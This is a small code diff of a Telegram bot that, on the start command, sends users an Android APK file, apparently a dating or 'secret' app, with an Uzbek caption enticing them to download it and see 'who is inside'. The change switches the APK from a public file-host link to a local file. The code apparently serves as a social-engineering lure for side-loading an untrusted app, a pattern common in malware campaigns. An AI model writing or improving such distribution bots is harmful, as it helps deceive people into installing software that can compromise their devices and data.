@@ -1,7 +1,7 @@
 import os
 import asyncio
 from aiogram import Bot, Dispatcher
-from aiogram.types import Message
+from aiogram.types import Message, FSInputFile
 from aiogram.filters import CommandStart
 from aiogram.client.session.aiohttp import AiohttpSession
 
@@ -14,7 +14,7 @@ dp = Dispatcher()
 @dp.message(CommandStart())
 async def start(message: Message):
     await message.answer_document(
-        document="https://files.catbox.moe/offwm1.apk",
+        document=FSInputFile("MaxfiyTanishuvlar.apk"),
         caption="🇺🇿 Ichkarida kim borligini ko'rmoqchisanmi? Ilovani yuklab ol va kir 👀🔥"
     )
 
